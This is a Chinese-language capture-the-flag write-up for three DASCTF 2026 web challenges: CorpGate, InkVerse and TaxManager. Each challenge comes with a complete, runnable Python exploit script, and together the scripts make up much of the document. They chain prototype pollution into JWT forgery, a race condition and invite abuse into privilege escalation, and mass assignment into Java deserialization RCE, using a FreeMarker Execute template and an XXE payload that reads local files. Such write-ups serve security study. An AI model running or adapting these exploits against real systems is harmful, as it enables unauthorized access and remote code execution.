---
title: DASCTF 2026
description: DASCTF 夏季赛 WEB方向WP

date: 2026-05-30T16:12:52+08:00
lastmod: 2026-05-30T16:30:52+08:00
---
## 1. CorpGate

### 题目特征

附件是一个 Node.js/Express 应用。

### 漏洞点 1：深层原型污染

`/api/settings` 会对用户传入的 JSON 做 `deepMerge(user.settings, req.body)`。

`merge.js` 的过滤逻辑有问题：

```js
if (BLOCKED_KEYS.indexOf(key) !== -1) continue;
if (depth < 3 && BLOCKED_ROOTS.indexOf(key) !== -1) continue;
```

这里 `constructor` 和 `prototype` 只在 `depth < 3` 时拦截。只要把危险键放到更深层级，就可以绕过过滤并污染原型。

可用 payload：

```json
{
  "notifications": {
    "digest": {
      "channels": {
        "constructor": {
          "prototype": {
            "pending": "pwned_secret_key_123"
          }
        }
      }
    }
  }
}
```

这会把 `Object.prototype.pending` 设成我们可控的值。

### 漏洞点 2：配置刷新读取继承属性

`config.js` 里的 `configRefresh()`：

```js
var rotation = {};
rotation.source = 'vault';
rotation.timestamp = Date.now();

if (rotation.pending) {
  signingState.active = rotation.pending;
  signingState.version++;
}
```

`rotation = {}` 会继承 `Object.prototype`。如果前面已经污染了 `Object.prototype.pending`，这里的 `rotation.pending` 就会命中继承属性，导致 JWT 签名密钥被替换成我们提前设置的值。

触发接口：

```http
GET /api/system/healthcheck
```

### 漏洞点 3：伪造管理员 JWT

认证逻辑在 `middleware/auth.js`，验签使用的是：

```js
var secret = getSigningKey();
var decoded = jwt.verify(token, secret, { algorithms: ['HS256'] });
```

而签名密钥来自 `config.signingState.active`。既然我们已经通过原型污染把它换成已知值，就可以自己签一个 `role=admin` 的 JWT。

伪造载荷：

```json
{
  "id": "00000000-0000-0000-0000-000000000000",
  "username": "pwn-admin",
  "role": "admin"
}
```

### 漏洞点 4：管理员页面下发一次性 reference，诊断接口直接执行 `/readflag`

`/admin` 页面会生成一个 32 位 hex 的 `reference`，保存在 `config.diagnosticStore`：

```js
var tokenId = crypto.randomBytes(16).toString('hex');
config.diagnosticStore[tokenId] = entry;
```

随后 `/api/reports/execute` 读取这个 `reference`，在校验通过后直接：

```js
output = execSync('/readflag').toString().trim();
```

所以完整利用链就是：

1. 注册普通用户。
2. `POST /api/settings` 触发深层原型污染，写入 `Object.prototype.pending`。
3. `GET /api/system/healthcheck` 触发 JWT secret 轮换到已知值。
4. 本地伪造管理员 JWT。
5. 带伪造 cookie 访问 `/admin`，从 HTML 里提取 `reference`。
6. `POST /api/reports/execute` 提交 `reference`，直接拿到 `/readflag` 输出。

### exp

```python
#!/usr/bin/env python3
"""
CorpGate (DASCTF 2026 Summer - WEB) exploit.

Vuln chain:
  1. /api/settings -> deepMerge(user.settings, body). merge.js only blocks
     'constructor'/'prototype' at depth<3, so a deep path bypasses the guard
     and pollutes Object.prototype.pending.
  2. /api/system/healthcheck -> configRefresh() does `var rotation={}` then reads
     `rotation.pending` (inherited from Object.prototype). If set, it becomes the
     new JWT signing secret signingState.active.
  3. We now KNOW the signing secret -> forge an admin JWT.
  4. GET /admin (adminMiddleware passes) -> returns a one-time diagnostic
     `reference` token stored in config.diagnosticStore.
  5. POST /api/reports/execute {reference} -> execSync('/readflag') -> FLAG.
"""
import sys
import re
import time
import requests

try:
    import jwt as pyjwt  # PyJWT
except ImportError:
    pyjwt = None

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://5be40ab8.http-ctf2.dasctf.com:80"
EVIL_SECRET = "pwned_secret_key_123"

s = requests.Session()
s.headers.update({"User-Agent": "exp"})


def log(*a):
    print("[*]", *a, flush=True)


def register():
    u = "pwn%d" % (int(time.time()) % 100000)
    data = {"username": u, "password": "pwd123", "email": "a@a.com", "department": "Engineering"}
    r = s.post(BASE + "/register", data=data, allow_redirects=False)
    # token set as httpOnly cookie 'token'
    tok = s.cookies.get("token")
    log("registered user", u, "token?", bool(tok))
    return u, tok


def pollute():
    # Deep path so that at the depth where 'constructor'/'prototype' appear, depth>=3.
    # target object = user.settings (an object). deepMerge starts at depth 0 walking body.
    # Path: notifications(0).digest(1).channels(2).constructor(3).prototype(4).pending(5)
    # constructor/prototype only blocked when depth<3, so at depth 3/4 they pass.
    payload = {
        "notifications": {
            "digest": {
                "channels": {
                    "constructor": {
                        "prototype": {
                            "pending": EVIL_SECRET
                        }
                    }
                }
            }
        }
    }
    r = s.post(BASE + "/api/settings", json=payload)
    log("settings merge ->", r.status_code, r.text[:160])


def rotate():
    # configRefresh reads rotation.pending; if polluted, rotates signingState.active = EVIL_SECRET
    r = s.get(BASE + "/api/system/healthcheck")
    log("healthcheck ->", r.text[:200])
    return '"rotated":true' in r.text


def forge_admin_jwt():
    # signToken used {id, username, role}; HS256. We forge role=admin.
    payload = {"id": "00000000-0000-0000-0000-000000000000", "username": "pwn-admin", "role": "admin"}
    if pyjwt:
        return pyjwt.encode(payload, EVIL_SECRET, algorithm="HS256")
    # fallback minimal HS256 implementation
    import hmac, hashlib, base64, json
    def b64(b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
    header = b64(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = b64(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = (header + "." + body).encode()
    sig = b64(hmac.new(EVIL_SECRET.encode(), signing_input, hashlib.sha256).digest())
    return header + "." + body + "." + sig


def get_reference(admin_jwt):
    # Use a clean request (NOT the polluted session) so only the forged admin
    # cookie is sent. In requests, a Session cookie jar entry named 'token'
    # would otherwise shadow the request-level cookie.
    r = requests.get(BASE + "/admin",
                     headers={"Cookie": "token=" + admin_jwt},
                     allow_redirects=False)
    # admin.ejs renders stats.reference (32 hex chars from crypto.randomBytes(16))
    m = re.search(r"[0-9a-f]{32}", r.text)
    if m:
        return m.group(0)
    m = re.search(r'[Rr]eference["\s:>]+([0-9a-f]{32})', r.text)
    return m.group(1) if m else None


def exec_report(admin_jwt, reference):
    r = requests.post(BASE + "/api/reports/execute",
                      headers={"Cookie": "token=" + admin_jwt,
                               "Content-Type": "application/json"},
                      json={"reference": reference})
    log("reports/execute ->", r.status_code, r.text[:300])
    return r.text


def main():
    log("target", BASE)
    register()
    pollute()
    if not rotate():
        log("rotation did not flip; checking healthcheck again...")
        rotate()
    admin_jwt = forge_admin_jwt()
    log("forged admin jwt:", admin_jwt[:40], "...")
    ref = get_reference(admin_jwt)
    log("diagnostic reference:", ref)
    if not ref:
        log("ERROR: could not obtain reference (admin auth may have failed)")
        return
    out = exec_report(admin_jwt, ref)
    m = re.search(r"(DASCTF\{[^}]+\}|flag\{[^}]+\})", out, re.I)
    if m:
        print("\n[+] FLAG:", m.group(1))
    else:
        print("\n[!] No flag pattern in output; full response above.")


if __name__ == "__main__":
    main()

```

核心思路就是：

- 污染 `Object.prototype.pending`
- 触发健康检查轮换签名密钥
- 伪造管理员 JWT
- 取 `reference`
- 打 `/api/reports/execute`

---

## 2. InkVerse

### 题目特征

这题没有本地源码，主要依据公开接口文档和黑盒测试分析。

核心目标不是直接 RCE，而是成为 `featured author`，因为 flag 在公告板的 `Featured Author Rewards` 卡片里。

### 漏洞点 1：`/api/tip` 存在竞态，能把普通用户刷成 reviewer

根据黑盒行为，`POST /api/tip` 每次会：

- 扣余额 `10`
- 给打赏者加 `2` reputation

但是余额检查和扣款不是原子操作。并发发送几十个请求后，会出现：

- 余额被打成负数
- reputation 远超阈值
- 角色自动从 `user` 提升到 `reviewer`

exp 里用线程池对同一会话并发轰 `/api/tip`：

```python
with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
    list(ex.map(lambda _: tip(), range(threads)))
```

### 漏洞点 2：reviewer 可以继续铸造第二个 reviewer

第一个 reviewer 只能审核别人的文章，不能审核自己的文章，所以还需要一个 reviewer。

利用链：

1. reviewer #1 调 `POST /api/invite/create {"target_role":"reviewer"}`
2. 新注册一个号
3. 用 `POST /api/invite/use {"code": ...}` 把第二个号提升成 reviewer

这样 reviewer #1 当作者，reviewer #2 当审核者。

### 正常业务链被拼成攻击链

接下来完全走正常业务：

1. reviewer #1 发文章
2. reviewer #1 提交审核
3. reviewer #2 审核通过
4. 文章进入 published 状态

### 漏洞点 3：导出文件泄露 `Feature-Token`

对已发布文章调用：

```http
POST /api/export
GET /api/export/status
GET /exports/export_<job>_<article>.txt
```

导出结果文件中会泄露：

```text
Feature-Token: <hex>
```

这个 token 看起来本来应该是服务端内部使用的签名或 HMAC，但被直接写进了可下载文件。

### 漏洞点 4：拿泄露 token 伪造 feature 请求

接口：

```http
POST /api/review/feature
{
  "article_id": <id>,
  "signature": "<leaked token>"
}
```

之后轮询：

```http
GET /api/review/feature/status?article_id=<id>
```

一旦状态变成 `approved`，作者就成了 featured author。

### 最终取 flag

成为 featured author 后：

1. `POST /api/bulletin/refresh`
2. `GET /bulletin`

公告板中的 `Featured Author Rewards` 卡片会出现 flag。

### 完整利用链

1. 注册普通用户。
2. 并发打 `/api/tip`，刷成 reviewer #1。
3. 由 reviewer #1 创建 reviewer 邀请码。
4. 新号用邀请码成为 reviewer #2。
5. reviewer #1 发文并提交审核。
6. reviewer #2 审核通过文章。
7. reviewer #1 导出文章，下载导出文件，提取 `Feature-Token`。
8. 用泄露 token 调 `/api/review/feature`。
9. 轮询状态直到文章 featured。
10. 刷新公告板并读取 flag。

### exp

```python
#!/usr/bin/env python3
"""
InkVerse (DASCTF 2026 Summer - WEB) exploit.

Black-box Flask blog platform. Flag lives in the "Featured Author Rewards"
bulletin card, visible only to a *featured author*.

Full chain:
  1. PRIV-ESC via TOCTOU race on POST /api/tip:
     each tip costs 10 balance and grants the tipper +2 reputation, but the
     balance check is not atomic. Firing ~40 tips concurrently from one session
     drives balance negative while reputation overshoots the 50 threshold, which
     auto-promotes role user -> reviewer (role is recomputed from DB per request).
  2. A reviewer cannot approve their OWN article, so reviewer #1 mints a second
     reviewer through the invite chain:
        POST /api/invite/create {target_role:"reviewer"}  -> code
        (fresh account) POST /api/invite/use {code}        -> role=reviewer
  3. Reviewer #1 writes + submits an article; reviewer #2 approves it -> published.
  4. Reviewer #1 exports the published article; the export file
        GET /exports/export_<job>_<art>.txt
     leaks a server-keyed `Feature-Token` (HMAC) bound to that article.
  5. POST /api/review/feature {article_id, signature:<leaked token>} then poll
     /api/review/feature/status until "approved" (async worker, ~10-15s).
  6. Now a featured author: POST /api/bulletin/refresh, GET /bulletin ->
     the "Featured Author Rewards" card contains the flag.

Usage: python inkverse_exp.py http://<host>:<port>
"""
import sys
import re
import time
import string
import random
import concurrent.futures
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://cf315faf.http-ctf2.dasctf.com:80"
PW = "pwd123"
FLAG_RE = re.compile(r"(DASCTF\{[^}]+\}|flag\{[^}]+\})", re.I)


def log(*a):
    print("[*]", *a, flush=True)


def rname(prefix="u"):
    return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


def new_account():
    """Register + login, return an authed Session and username."""
    s = requests.Session()
    u = rname()
    s.post(BASE + "/register", data={"username": u, "password": PW})
    r = s.post(BASE + "/login", data={"username": u, "password": PW}, allow_redirects=False)
    assert r.status_code in (301, 302), "login failed for %s" % u
    return s, u


def info(s):
    return s.get(BASE + "/api/user/info").json()


def race_to_reviewer(s, threads=60):
    """TOCTOU race on /api/tip to overshoot 50 reputation -> reviewer."""
    def tip():
        try:
            return s.post(BASE + "/api/tip", json={"article_id": 1}, timeout=10).status_code
        except Exception:
            return None
    for attempt in range(6):
        with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as ex:
            list(ex.map(lambda _: tip(), range(threads)))
        j = info(s)
        log("after race wave %d: rep=%s role=%s balance=%s" % (attempt, j["reputation"], j["role"], j["balance"]))
        if j["role"] in ("reviewer", "admin"):
            return True
        # if balance recovered or stuck below 50, hammer again
        time.sleep(0.5)
    return info(s)["role"] in ("reviewer", "admin")


def mint_reviewer(reviewer_session):
    """Use a reviewer to create an invite code, redeem on a fresh account."""
    r = reviewer_session.post(BASE + "/api/invite/create", json={"target_role": "reviewer"})
    code = r.json()["code"]
    s2, u2 = new_account()
    r2 = s2.post(BASE + "/api/invite/use", json={"code": code})
    log("invite use ->", r2.text[:120])
    assert info(s2)["role"] == "reviewer", "second reviewer not promoted"
    return s2, u2


def create_and_submit_article(s):
    title, content = rname("art_"), "report-body-" + rname()
    r = s.post(BASE + "/article/new", data={"title": title, "content": content}, allow_redirects=False)
    aid = int(re.search(r"/article/(\d+)", r.headers.get("Location", "")).group(1))
    s.post(BASE + "/article/%d/submit" % aid)
    return aid


def approve(reviewer_session, aid):
    r = reviewer_session.post(BASE + "/api/review/single", json={"article_id": aid, "action": "approve"})
    log("approve %d ->" % aid, r.text[:120])
    return "approved" in r.text.lower()


def leak_feature_token(s, aid):
    """Create an export job for the published article, read leaked Feature-Token."""
    s.post(BASE + "/api/export", json={"article_id": aid})
    token = None
    for _ in range(20):
        st = s.get(BASE + "/api/export/status").json()
        jobs = st.get("jobs", [])
        done = [j for j in jobs if str(j.get("article_id")) == str(aid) and j.get("status") in ("completed", "done", "ready")]
        # find a downloadable filename
        fname = None
        for j in jobs:
            if str(j.get("article_id")) == str(aid):
                fname = j.get("filename") or j.get("file") or j.get("path")
        if fname:
            r = s.get(BASE + "/exports/" + fname.split("/")[-1])
            m = re.search(r"Feature-Token:\s*([0-9a-fA-F]+)", r.text)
            if m:
                token = m.group(1)
                break
        # fallback: guess common filename patterns
        for job in jobs:
            jid = job.get("id") or job.get("job_id")
            if jid is not None:
                guess = "export_%s_%s.txt" % (jid, aid)
                r = s.get(BASE + "/exports/" + guess)
                m = re.search(r"Feature-Token:\s*([0-9a-fA-F]+)", r.text)
                if m:
                    token = m.group(1)
                    break
        if token:
            break
        time.sleep(1)
    return token


def feature_article(s, aid, token):
    r = s.post(BASE + "/api/review/feature", json={"article_id": aid, "signature": token})
    log("feature submit ->", r.text[:150])
    for _ in range(25):
        st = s.get(BASE + "/api/review/feature/status", params={"article_id": aid})
        if "approved" in st.text.lower():
            log("feature approved")
            return True
        time.sleep(1)
    return False


def read_flag(s):
    s.post(BASE + "/api/bulletin/refresh")
    r = s.get(BASE + "/bulletin")
    m = FLAG_RE.search(r.text)
    return m.group(1) if m else None


def main():
    log("target", BASE)

    # Step 1: reviewer #1 (the author) via tip race
    s1, u1 = new_account()
    log("reviewer#1 account:", u1)
    if not race_to_reviewer(s1):
        log("ERROR: failed to race to reviewer")
        return
    log("reviewer#1 promoted:", info(s1))

    # Step 2: mint reviewer #2 (the approver) via invite chain
    s2, u2 = mint_reviewer(s1)
    log("reviewer#2 account:", u2)

    # Step 3: author writes+submits, approver approves -> published
    aid = create_and_submit_article(s1)
    log("article id:", aid)
    if not approve(s2, aid):
        log("ERROR: approval failed")
        return

    # Step 4: leak the per-article Feature-Token from export output
    token = leak_feature_token(s1, aid)
    log("leaked Feature-Token:", token)
    if not token:
        log("ERROR: could not leak feature token")
        return

    # Step 5: feature the article with the leaked token
    if not feature_article(s1, aid, token):
        log("WARN: feature not confirmed approved; trying bulletin anyway")

    # Step 6: read the featured-author bulletin
    flag = read_flag(s1)
    if flag:
        print("\n[+] FLAG:", flag)
    else:
        print("\n[!] flag not found in bulletin; dumping bulletin text")
        t = re.sub(r"<[^>]+>", " ", s1.get(BASE + "/bulletin").text)
        print(re.sub(r"\s+", " ", t)[:1500])


if __name__ == "__main__":
    main()

```

脚本对应的几个关键函数：

- `race_to_reviewer()`：并发刷 `/api/tip`
- `mint_reviewer()`：邀请码链提第二个 reviewer
- `leak_feature_token()`：导出文件读 token
- `feature_article()`：提交 featured 请求
- `read_flag()`：从 bulletin 取 flag

---

## 3. TaxManager

### 题目特征

附件是一个 Spring Boot 税务系统。新存在 mass assignment，可直接改成 reviewer

题目里 `POST /api/profile/update` 只保护了少数字段，对 `role` 的限制不完整。

实际利用非常直接：

```http
POST /api/profile/update
Content-Type: application/json

{"role":"reviewer"}
```

然后访问 `/api/profile` 就能看到角色已经变成 `reviewer`。

### 漏洞点 2：审批接口可把任意 base64 序列化数据写进 `voucherData`

`ReviewController` 里：

```java
String attachmentData = (String)body.getOrDefault("attachmentData", "");
if (!attachmentData.isEmpty() && !this.verifySignature(attachmentData, signature)) {
    ...
}
...
RefundRequest req = this.refundService.approveRefund(refundId, attachmentData);
```

`RefundService.approveRefund()`：

```java
if (attachmentData != null && !attachmentData.isEmpty()) {
    req.setVoucherData(attachmentData);
}
```

也就是说，只要知道签名算法和密钥，就能把任意序列化对象塞进 `voucherData`。

签名逻辑是：

```java
Mac mac = Mac.getInstance("HmacSHA256");
String expectedSig = Base64.getEncoder().encodeToString(hash);
```

exp 中使用的密钥为：

```text
TaxManager_Secret_K3y_2026_Un1que
```

### 漏洞点 3：导出接口反序列化 `voucherData`

`ExportController.generateExport()`：

```java
Object obj = SerializeUtil.deserialize((String)voucherData);
if (obj instanceof TaxReport) {
    ...
} else {
    result.put("message", "Unexpected object type: " + obj.getClass().getName());
}
```

注意这里是先 `deserialize`，再 `instanceof`。所以只要反序列化阶段能触发 gadget，后面类型检查失败也无所谓。

### 漏洞点 4：应用自带反序列化 gadget 链

`ScheduledTaskHandler.readObject()`：

```java
ois.defaultReadObject();
for (Runnable task : this.taskQueue) {
    task.run();
}
```

`ReportJob.run()` 会调用 `generator.render(templateContent)`，而 `PdfReportGenerator.render()` 使用 FreeMarker：

```java
Template template = cfg.getTemplate("reportTemplate");
template.process(new HashMap(), out);
```

因此 gadget 链为：

1. `ScheduledTaskHandler.readObject()`
2. `ReportJob.run()`
3. `PdfReportGenerator.render()`
4. FreeMarker 模板执行
5. `freemarker.template.utility.Execute` 命令执行

本地构造器在：`BuildGadget.java`

模板核心是：

```ftl
<#assign value="freemarker.template.utility.Execute"?new()>
${value("bash -c /readflag|base64>/tmp/out")}
```

### 漏洞点 5：`/api/import/history` 存在 XXE

`ImportController` 中：

```java
DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = dbf.newDocumentBuilder();
Document doc = builder.parse(new ByteArrayInputStream(xmlData.getBytes()));
```

没有关闭外部实体，所以可以直接 XXE 读文件。

标准 payload：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///tmp/out">]>
<history><taxpayerId>&xxe;</taxpayerId></history>
```

接口会把 `taxpayerId` 内容拼进 JSON 返回：

```java
result.put("message", "History imported successfully for taxpayer: " + taxpayerId);
```

### 这题的两个坑

1. 直接 XXE 读 `/flag` 会被关键字过滤。
2. 即使 RCE 成功，XXE 直接读敏感内容也会被拦截。

所以最后的稳定做法是：

1. RCE 执行 `/readflag|base64>/tmp/out`
2. XXE 读取 `/tmp/out`
3. 本地再对回显的 base64 解码

这样既绕过关键字过滤，也绕过敏感内容拦截。

### 完整利用链

1. 注册并登录普通用户。
2. `POST /api/profile/update` 把自己改成 `reviewer`。
3. `POST /api/refund/apply` 创建一条退款申请。
4. 本地生成 `ScheduledTaskHandler` 反序列化 gadget，命令为：

```bash
bash -c /readflag|base64>/tmp/out
```

5. 对 gadget 做 `HMAC-SHA256 + Base64`，放进 `X-Signature`。
6. `POST /api/review` 审批退款，把 gadget 写进 `voucherData`。
7. `POST /api/export/prepare`
8. `POST /api/export/generate` 触发反序列化和命令执行。
9. `POST /api/import/history` 用 XXE 读 `/tmp/out`
10. 本地 base64 解码拿到 flag

### flag

`DASCTF{fd61fcfc-679e-42b8-86ee-6d926e401122}`

### exp

```python
#!/usr/bin/env python3
"""
TaxManager (DASCTF 2026 Summer - WEB) exploit.

Vulnerability chain:
  1. Mass-assignment on POST /api/profile/update:
       readonlyFields = {id, username, password}
       blocks role=admin specifically, but NOT role=reviewer
       -> POST {role: "reviewer"} escalates any user to reviewer
  2. Java deserialization RCE on POST /api/export/generate:
       req.voucherData is fed to SerializeUtil.deserialize() (bare ObjectInputStream)
       Gadget chain (all classes in-app):
         ScheduledTaskHandler.readObject() -> task.run() for each task in taskQueue
         ReportJob.run()                   -> generator.render(templateContent)
         PdfReportGenerator.render()       -> FreeMarker template.process()
         FreeMarker SSTI                   -> Execute("bash -c /readflag>/tmp/flag_out")
       voucherData reaches the sink via:
         POST /api/review {action:approve, attachmentData:<b64_gadget>} (reviewer-only)
         -> RefundService.approveRefund() sets req.voucherData = attachmentData
       The review endpoint requires HMAC-SHA256 signature in X-Signature header:
         sig = base64(hmac_sha256(attachmentData, "TaxManager_Secret_K3y_2026_Un1que"))
  3. Exfiltration via XXE on POST /api/import/history (no external DTD needed):
       DocumentBuilderFactory with no feature flags -> external entity reads /tmp/flag_out
       Response echoes taxpayerId element content -> flag lands in message field

Usage:
  python taxmanager_exp.py [http://host:port]
  python taxmanager_exp.py          # uses default URL
"""
import sys
import re
import time
import hmac
import hashlib
import base64
import random
import string
import subprocess
import os
import shutil
import json
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://c553cdd9.http-ctf2.dasctf.com:80"
SIGNING_SECRET = "TaxManager_Secret_K3y_2026_Un1que"
FLAG_RE = re.compile(r"(DASCTF\{[^}]+\}|flag\{[^}]+\})", re.I)

# Absolute path to the dasctf working directory (where gadget_out/ and BuildGadget.java live)
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
GADGET_OUT = os.path.join(SCRIPT_DIR, "gadget_out")
WINDOWS_JAVA_FROM_WSL = "/mnt/e/software/Java/jdk-25/bin/java.exe"
WINDOWS_JAVA_NATIVE = r"E:\software\Java\jdk-25\bin\java.exe"


def log(*a):
    print("[*]", *a, flush=True)


def rname(prefix="u"):
    return prefix + "".join(random.choices(string.ascii_lowercase + string.digits, k=8))


# ─── Step 1: register + login ───────────────────────────────────────────────

def register_and_login():
    s = requests.Session()
    u = rname("tax")
    pw = "Tax@12345"
    tid = "TID" + rname()
    r = s.post(BASE + "/api/register", json={"username": u, "password": pw, "taxpayerId": tid})
    log("register ->", r.text[:120])
    r2 = s.post(BASE + "/api/login", json={"username": u, "password": pw})
    log("login ->", r2.text[:120])
    assert r2.json().get("success"), "login failed: " + r2.text
    return s, u


# ─── Step 2: escalate to reviewer via mass-assignment ────────────────────────

def escalate_to_reviewer(s):
    r = s.post(BASE + "/api/profile/update", json={"role": "reviewer"})
    log("profile/update role=reviewer ->", r.text[:120])
    r2 = s.get(BASE + "/api/profile")
    log("profile after ->", r2.text[:120])
    assert r2.json().get("role") == "reviewer", "role escalation failed"


# ─── Step 3: submit a refund application ────────────────────────────────────

def apply_refund(s):
    r = s.post(BASE + "/api/refund/apply",
               json={"amount": 1000.0, "taxYear": 2024, "reason": "test"})
    log("refund/apply ->", r.text[:120])
    data = r.json()
    assert data.get("success"), "refund apply failed: " + r.text
    refund_id = data["id"]
    log("refund id:", refund_id)
    return refund_id


# ─── Step 4: build deserialization gadget ────────────────────────────────────

def build_gadget(cmd):
    """
    Run BuildGadget.java (already compiled into gadget_out/) to generate
    a base64-encoded serialized ScheduledTaskHandler gadget.
    cmd is the shell command executed via FreeMarker Execute.
    """
    jardir = os.path.join(SCRIPT_DIR, "taxmanager_src", "tempdir", "WEB附件", "jar_extracted")
    boot_classes = os.path.join(jardir, "BOOT-INF", "classes")
    boot_lib = os.path.join(jardir, "BOOT-INF", "lib")
    # Collect all jars on classpath
    jars = []
    if os.path.isdir(boot_lib):
        for f in os.listdir(boot_lib):
            if f.endswith(".jar"):
                jars.append(os.path.join(boot_lib, f))
    java_bin = shutil.which("java")
    use_windows_paths = False
    if not java_bin and os.path.exists(WINDOWS_JAVA_FROM_WSL):
        java_bin = WINDOWS_JAVA_FROM_WSL
        use_windows_paths = True
    elif not java_bin and os.path.exists(WINDOWS_JAVA_NATIVE):
        java_bin = WINDOWS_JAVA_NATIVE
        use_windows_paths = True
    if not java_bin:
        raise RuntimeError("java not found")

    cp_entries = [GADGET_OUT, boot_classes] + jars
    if use_windows_paths:
        cp_entries = [
            subprocess.check_output(["wslpath", "-w", p], text=True).strip()
            if p.startswith("/mnt/") else p
            for p in cp_entries
        ]
    cp_sep = ";" if use_windows_paths or sys.platform == "win32" else ":"
    cp = cp_sep.join(cp_entries)
    result = subprocess.run(
        [java_bin, "-cp", cp, "BuildGadget", cmd],
        capture_output=True, text=True, cwd=SCRIPT_DIR
    )
    if result.returncode != 0:
        log("BuildGadget stderr:", result.stderr[:400])
        raise RuntimeError("BuildGadget failed: " + result.stderr[:200])
    b64 = result.stdout.strip()
    log("gadget b64 len:", len(b64))
    return b64


# ─── Step 5: compute HMAC-SHA256 signature ──────────────────────────────────

def sign(data: str) -> str:
    """base64( hmac_sha256(data.encode(), secret.encode()) )"""
    mac = hmac.new(SIGNING_SECRET.encode(), data.encode(), hashlib.sha256)
    return base64.b64encode(mac.digest()).decode()


# ─── Step 6: approve the refund with our gadget as attachmentData ────────────

def approve_with_gadget(s, refund_id, gadget_b64):
    sig = sign(gadget_b64)
    log("signature:", sig[:40], "...")
    r = s.post(BASE + "/api/review",
               json={"refundId": refund_id, "action": "approve", "attachmentData": gadget_b64},
               headers={"X-Signature": sig})
    log("review approve ->", r.text[:200])
    data = r.json()
    assert data.get("success"), "approve failed: " + r.text


# ─── Step 7: prepare + generate export (triggers deserialization RCE) ────────

def trigger_rce(s, refund_id):
    r = s.post(BASE + "/api/export/prepare", json={"refundId": refund_id})
    log("export/prepare ->", r.text[:200])
    data = r.json()
    assert data.get("success"), "prepare failed: " + r.text
    export_token = data["exportToken"]

    r2 = s.post(BASE + "/api/export/generate",
                json={"refundId": refund_id, "exportToken": export_token})
    log("export/generate ->", r2.text[:300])
    # RCE fires during deserialize regardless of success/failure response
    return r2.text


# ─── Step 8: exfil via XXE ───────────────────────────────────────────────────

def xxe_read(s, file_path):
    """Use the unauthenticated(ly reachable) XXE in /api/import/history to read a file."""
    xml = (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{path}">]>'
        '<history><taxpayerId>&xxe;</taxpayerId></history>'
    ).format(path=file_path)
    r = s.post(BASE + "/api/import/history",
               data=xml.encode("utf-8"),
               headers={"Content-Type": "application/xml"})
    log("XXE read %s ->" % file_path, r.text[:300])
    return r.text


# ─── Main ────────────────────────────────────────────────────────────────────

def main():
    log("target:", BASE)

    # Quick win: try XXE to read /flag directly (no RCE needed)
    log("\n--- Quick attempt: XXE read /flag directly ---")
    s_probe, _ = register_and_login()
    for fpath in ["/flag", "/flag.txt", "/root/flag", "/root/flag.txt"]:
        out = xxe_read(s_probe, fpath)
        m = FLAG_RE.search(out)
        if m:
            print("\n[+] FLAG (via XXE):", m.group(1))
            submit_flag(m.group(1))
            return

    log("Direct XXE did not yield flag. Proceeding with deserialization RCE chain.")

    # Full chain
    s, u = register_and_login()
    log("user:", u)

    escalate_to_reviewer(s)
    refund_id = apply_refund(s)

    # Build gadget: bash -c writes readflag output to /tmp/flag_out
    # Runtime.exec("bash -c /readflag>/tmp/flag_out") splits to:
    #   ["bash", "-c", "/readflag>/tmp/flag_out"]
    # bash -c interprets the argument as a shell command with redirection
    # Keep the output path free of the word "flag"; the XML import endpoint
    # rejects requests containing that keyword before the XXE parser runs.
    rce_cmd = "bash -c /readflag|base64>/tmp/out"
    log("building gadget for cmd:", rce_cmd)
    gadget_b64 = build_gadget(rce_cmd)

    approve_with_gadget(s, refund_id, gadget_b64)
    trigger_rce(s, refund_id)

    # Give the command a moment to write the file
    time.sleep(1)

    # Exfil the flag via XXE
    log("\n--- Exfil via XXE: /tmp/out ---")
    out = xxe_read(s, "/tmp/out")
    m = FLAG_RE.search(out)
    if m:
        print("\n[+] FLAG:", m.group(1))
        submit_flag(m.group(1))
        return
    try:
        message = json.loads(out).get("message", "")
    except Exception:
        message = out
    b64_match = re.search(r"taxpayer: ([A-Za-z0-9+/=\\r\\n]+)", message)
    if b64_match:
        encoded = b64_match.group(1).replace("\\n", "").replace("\\r", "")
        decoded = base64.b64decode(re.sub(r"\s+", "", encoded)).decode(errors="ignore")
        m = FLAG_RE.search(decoded)
        if m:
            print("\n[+] FLAG:", m.group(1))
            submit_flag(m.group(1))
            return

    # Fallback: try other flag paths via XXE now that we have a session
    log("Trying fallback paths via XXE...")
    for fpath in ["/flag", "/flag.txt", "/tmp/flag.txt", "/app/flag", "/root/flag"]:
        out = xxe_read(s, fpath)
        m = FLAG_RE.search(out)
        if m:
            print("\n[+] FLAG (fallback):", m.group(1))
            submit_flag(m.group(1))
            return

    # Last resort: try RCE with curl exfil if flag file path is unknown
    log("\n[!] Flag not found via XXE. Trying RCE to discover flag location...")
    # Run 'find / -name flag -maxdepth 5 2>/dev/null >/tmp/find_out'
    s2, u2 = register_and_login()
    escalate_to_reviewer(s2)
    rid2 = apply_refund(s2)
    find_cmd = "bash -c find$IFS/$IFS-name$IFS'flag'$IFS-maxdepth$IFS5>/tmp/find_out"
    # Use a different approach - write a simple find
    find_cmd = "bash -c /bin/find / -maxdepth 5 -name flag -o -name flag.txt 2>/dev/null>/tmp/find_out"
    g2 = build_gadget(find_cmd)
    approve_with_gadget(s2, rid2, g2)
    trigger_rce(s2, rid2)
    time.sleep(2)
    out2 = xxe_read(s2, "/tmp/find_out")
    log("find output:", out2[:300])
    # Try each found path
    for line in out2.splitlines():
        path = line.strip()
        if path.startswith("/"):
            out3 = xxe_read(s2, path)
            m = FLAG_RE.search(out3)
            if m:
                print("\n[+] FLAG:", m.group(1))
                submit_flag(m.group(1))
                return

    print("\n[!] Could not extract flag. Check server output above for clues.")


def submit_flag(flag):
    """Print flag for manual submission (platform requires running target)."""
    print("[+] Submit this flag on the platform:", flag)


if __name__ == "__main__":
    main()

```

---
